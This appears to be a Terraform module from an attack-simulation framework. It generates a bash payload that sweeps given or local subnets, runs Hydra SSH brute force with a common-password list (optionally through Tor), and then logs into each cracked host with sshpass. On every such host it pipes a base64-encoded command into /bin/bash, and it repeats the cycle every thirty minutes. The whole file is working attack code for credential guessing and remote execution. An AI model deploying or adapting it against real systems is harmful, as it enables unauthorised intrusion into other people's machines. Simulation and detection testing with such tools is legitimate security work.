locals {
    attack_dir = "/hydra"
    targets = flatten([ for target in var.inputs["targets"]: can(split("/", target)[1]) ? 
        [ for host_number in range(pow(2, 32 - split("/", target)[1])) : cidrhost(target, host_number) ]
        :
        [ target ]
    ])
    base64_command_payload = base64encode(var.inputs["payload"])
    payload = <<-EOT
    # Function to convert IP address to decimal
    ip_to_dec() {
        local IFS=.
        read ip1 ip2 ip3 ip4 <<< "$1"
        echo "$((ip1 * 16777216 + ip2 * 65536 + ip3 * 256 + ip4))"
    }

    # Function to convert decimal to IP address
    dec_to_ip() {
        local ip dec=$1
        for e in {3..0}; do
            ((octet = dec / (256 ** e) ))
            ((dec -= octet * 256 ** e))
            ip+="$${octet}."
        done
        echo "$${ip%?}"
    }

    # Main function to generate IP list from CIDR
    generate_ips() {
        local cidr="$1"
        local ip="$${cidr%/*}"
        local prefix="$${cidr#*/}"
        local netmask=$((0xffffffff ^ ((1 << (32 - prefix)) - 1)))

        local start=$(ip_to_dec "$ip")
        local start=$((start & netmask))
        local end=$((start | ((1 << (32 - prefix)) - 1)))

        for ((ip= start; ip <= end; ip++)); do
            dec_to_ip "$ip"
        done
    }

    log "cleaning app directory"
    rm -rf ${local.attack_dir}
    mkdir -p ${local.attack_dir}
    cd ${local.attack_dir}
    START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
    while true; do
        log "starting script..."
        LOCAL_NET=$(ip -o -f inet addr show | awk '/scope global/ {print $4}' | head -1)
        log "LOCAL_NET: $LOCAL_NET"
        log "Targets: ${join(",", local.targets)}"
        echo "${ length(local.targets) > 0 ? join("\n", local.targets) : "$(generate_ips $LOCAL_NET)" }" > /tmp/hydra-targets.txt
        cat > /tmp/hydra-users.txt <<'EOF'
    ${try(length(var.inputs["ssh_user"].username),"false") != "false" ? var.inputs["ssh_user"].username : "root" }
    EOF
        cat > /tmp/hydra-passwords.txt <<'EOF'
    123456
    123456789
    111111
    password
    qwerty
    abc123
    12345678
    password1
    1234567
    123123
    ${try(length(var.inputs["ssh_user"].password),"false") != "false" ? var.inputs["ssh_user"].password : "" }
    EOF
        if sudo docker ps -a | grep ${var.inputs["container_name"]}; then 
        sudo docker stop ${var.inputs["container_name"]}
        sudo docker rm ${var.inputs["container_name"]}
        fi
        truncate -s 0 /tmp/hydra-found.txt
        ${ var.inputs["use_tor"] == true ? <<-EOF
        log "Using tor network..."
        if ! docker ps | grep torproxy > /dev/null; then
        sudo docker run -d --rm --name torproxy -p 9050:9050 dperson/torproxy
        fi
        TORPROXY=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' torproxy)
        log "Running: proxychains hydra -V -L ${var.inputs["user_list"]} -P ${var.inputs["password_list"]} -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh"
        sudo /bin/bash -c "docker run -v /tmp:/tmp -e TORPROXY=$TORPROXY --name ${var.inputs["container_name"]} ${var.inputs["image"]} hydra -V -L ${var.inputs["user_list"]} -P ${var.inputs["password_list"]} -o /tmp/hydra-found.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
        sudo /bin/bash -c "docker logs ${var.inputs["container_name"]} >> $LOGFILE 2>&1"
        sudo /bin/bash -c "docker rm ${var.inputs["container_name"]}"
        log "Running: proxychains hydra -V -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh"
        sudo /bin/bash -c "docker run -v /tmp:/tmp -e TORPROXY=$TORPROXY --name ${var.inputs["container_name"]} ${var.inputs["image"]} hydra -V -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -o /tmp/hydra-found.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
        sudo /bin/bash -c "docker logs ${var.inputs["container_name"]} >> $LOGFILE 2>&1"
        sudo /bin/bash -c "docker rm ${var.inputs["container_name"]}"
        EOF
        : <<-EOF
        log "Running: hydra -V -L ${var.inputs["user_list"]} -P ${var.inputs["password_list"]} -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh"
        sudo /bin/bash -c "docker run -v /tmp:/tmp --entrypoint=hydra --name ${var.inputs["container_name"]} ${var.inputs["image"]} -V -L ${var.inputs["user_list"]} -P ${var.inputs["password_list"]} -o /tmp/hydra-found.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
        sudo /bin/bash -c "docker logs ${var.inputs["container_name"]} >> $LOGFILE 2>&1"
        sudo /bin/bash -c "docker rm ${var.inputs["container_name"]}"
        log "Running: hydra -V -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh"
        sudo /bin/bash -c "docker run -v /tmp:/tmp --entrypoint=hydra --name ${var.inputs["container_name"]} ${var.inputs["image"]} -V -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -o /tmp/hydra-found.txt -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
        sudo /bin/bash -c "docker logs ${var.inputs["container_name"]} >> $LOGFILE 2>&1"
        sudo /bin/bash -c "docker rm ${var.inputs["container_name"]}"
        EOF
        }
        # Read Hydra output file line by line
        while IFS= read -r line; do
            # Parse Hydra output
            host=$(echo "$line" | awk '{print $3}')
            username=$(echo "$line" | awk '{print $5}')
            password=$(echo "$line" | awk '{print $7}')
            log "Attempting to execute payload: sshpass -p \"$password\" ssh -o StrictHostKeyChecking=no \"$username\"@\"$host\" 'echo ${local.base64_command_payload} | base64 -d | /bin/bash"
            sshpass -p "$password" ssh -o StrictHostKeyChecking=no "$username"@"$host" 'echo ${local.base64_command_payload} | base64 -d | /bin/bash'
            log "Done"
        done < <(grep -v "^#" /tmp/hydra-found.txt | sort | uniq)
        log "Done."

        log 'waiting 30 minutes...';
        sleep 1800
        CHECK_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
        if [ "$CHECK_HASH" != "$START_HASH" ]; then
            log "payload update detected - exiting loop"
            break
        else
            log "restarting loop..."
            log "waiting ${var.inputs["attack_delay"]} seconds...";
            sleep ${var.inputs["attack_delay"]}
        fi
    done
    log "Done."
    EOT

    base64_payload = templatefile("${path.module}/../../delayed_start.sh", { config = {
        script_name = var.inputs["tag"]
        log_rotation_count = 2
        apt_pre_tasks = <<-EOT
        log "Checking for docker..."
        while ! command -v docker > /dev/null || ! docker ps > /dev/null; do
            log "docker not found or not ready - waiting"
            sleep 120
        done
        log "docker path: $(command -v  docker)"
        EOT
        apt_packages = "sshpass jq"
        apt_post_tasks = ""
        yum_pre_tasks =  <<-EOT
        log "Checking for docker..."
        while ! command -v docker > /dev/null || ! docker ps > /dev/null; do
            log "docker not found or not ready - waiting"
            sleep 120
        done
        log "docker path: $(command -v  docker)"
        EOT
        yum_packages = "sshpass jq"
        yum_post_tasks = ""
        script_delay_secs = var.inputs["attack_delay"]
        next_stage_payload = local.payload
    }})

    outputs = {
        base64_payload = base64gzip(local.base64_payload)
        base64_uncompressed_payload = base64encode(local.base64_payload)
        base64_uncompressed_payload_additional = []
    }
}